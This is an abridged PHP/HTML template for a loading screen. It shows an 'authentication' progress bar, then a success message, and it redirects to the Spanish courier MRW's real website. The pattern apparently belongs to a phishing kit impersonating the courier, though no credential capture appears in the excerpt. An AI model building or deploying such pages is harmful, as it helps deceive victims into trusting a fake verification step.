...
<head>
    ...
    <style>
        ...
        .loader-content { animation: fadeIn 1s ease-out 1.5s forwards; opacity: 0; width: 80%; max-width: 400px; transition: opacity 0.5s ease-in-out; }
        .loader-title { color: #ffffff; font-weight: 700; font-size: 1.4rem; margin-bottom: 10px; }
        .loader-text { color: #d1d1d1; font-size: 1.1rem; margin-bottom: 30px; }
        .progress-bar-container { width: 100%; height: 4px; background-color: rgba(255, 255, 255, 0.1); border-radius: 10px; overflow: hidden; transition: opacity 0.5s ease-in-out; }
        .progress-bar-fill { height: 100%; background-color: #d71920; width: 0%; animation: progressAnim 3s linear 1.5s forwards; }
...
<body>
    <div class="loader-wrapper">
        ...
        <div class="loader-content" id="loaderContent">
            <div id="statusContainer">
                <div class="loader-title" id="mainTitle"><?php echo $txt['loading_auth']; ?></div>
                <div class="loader-text" id="subTitle"><?php echo $txt['loading_wait']; ?></div>
            </div>
    ...
    <script>
        const next_page = 'https://www.mrw.es/';
        const successTitle = '<?php echo $txt['success_msg']; ?>';
        const redirectText = '<?php echo $txt['redirect_msg']; ?>';
        
        setTimeout(function() {
            document.getElementById('progressBar').classList.add('fade-out');
            ...
            setTimeout(() => {
                mainTitle.innerText = successTitle;
                mainTitle.style.color = '#ffffff';
                subTitle.innerText = redirectText;
